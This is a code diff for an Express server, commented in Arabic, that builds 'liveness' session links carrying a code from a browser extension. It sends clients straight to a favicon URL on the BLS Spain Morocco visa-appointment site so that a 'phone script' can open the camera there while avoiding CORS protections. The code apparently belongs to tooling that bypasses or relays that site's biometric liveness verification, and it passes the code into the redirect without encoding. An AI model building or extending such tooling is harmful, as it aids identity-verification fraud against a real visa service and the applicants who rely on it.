@@ -11,10 +11,14 @@ app.use(express.json());
 
 const masters = {};
 
+// 1. تعديل مسار توليد الرابط لاستقبال الكود
 app.get('/api/generate_link', (req, res) => {
     const sessionId = Math.floor(100000 + Math.random() * 900000).toString();
     const protocol = req.headers['x-forwarded-proto'] || 'http';
-    const clientLink = `${protocol}://${req.get('host')}/liveness?session_id=${sessionId}`;
+    const code = req.query.code || ""; // استقبال الكود من الإضافة
+
+    // إضافة الكود إلى رابط العميل
+    const clientLink = `${protocol}://${req.get('host')}/liveness?session_id=${sessionId}&code=${encodeURIComponent(code)}`;
 
     res.json({
         success: true,
@@ -23,8 +27,13 @@ app.get('/api/generate_link', (req, res) => {
     });
 });
 
+// 2. تعديل مسار صفحة العميل لعمل إعادة توجيه (Redirect)
 app.get('/liveness', (req, res) => {
-    res.send('<html><head><title>Samurai Secure</title></head><body id="samurai-canvas"></body></html>');
+    const sessionId = req.query.session_id;
+    const code = req.query.code;
+    
+    // إعادة توجيه العميل فوراً إلى صفحة BLS لكي يفتح سكريبت الهاتف الكاميرا بدون مشاكل حماية (CORS)
+    res.redirect(`https://www.blsspainmorocco.net/assets/images/favicon.png?session_id=${sessionId}&code=${code}`);
 });
 
 app.post('/api/submit', (req, res) => {
